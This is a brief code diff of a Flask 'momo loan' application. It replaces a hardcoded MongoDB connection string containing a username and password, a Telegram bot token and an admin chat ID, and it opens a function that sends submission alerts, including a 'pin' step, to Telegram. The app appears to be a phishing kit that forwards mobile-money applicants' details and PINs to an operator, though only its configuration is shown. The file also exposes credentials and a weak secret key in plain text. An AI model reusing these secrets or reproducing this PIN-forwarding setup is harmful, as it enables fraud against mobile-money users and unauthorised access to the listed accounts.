@@ -9,13 +9,13 @@ app = Flask(__name__)
 app.secret_key = "super_secret_momo_key"
 
 # MongoDB connection
-client = MongoClient("mongodb+srv://rotichb712_db_user:qwerty123@cluster0.repu7xo.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=Cluster0")
+client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
 
 # Telegram Configuration
-TELEGRAM_BOT_TOKEN = "9036127592:AAH47vMlW57SWDNqWAp9G2ldC4Lzj5z8_lU"
-TELEGRAM_ADMIN_CHAT_ID = "6558384338"
+TELEGRAM_BOT_TOKEN = "9005219416:AAF7DECue--jQbs8K7LkrTwflsclRoT5INM"
+TELEGRAM_ADMIN_CHAT_ID = "8177716749"
 
 def send_telegram_interactive_alert(app_data, stage_title="NEW SUBMISSION", step_code="pin"):
     db_id = str(app_data.get("_id"))
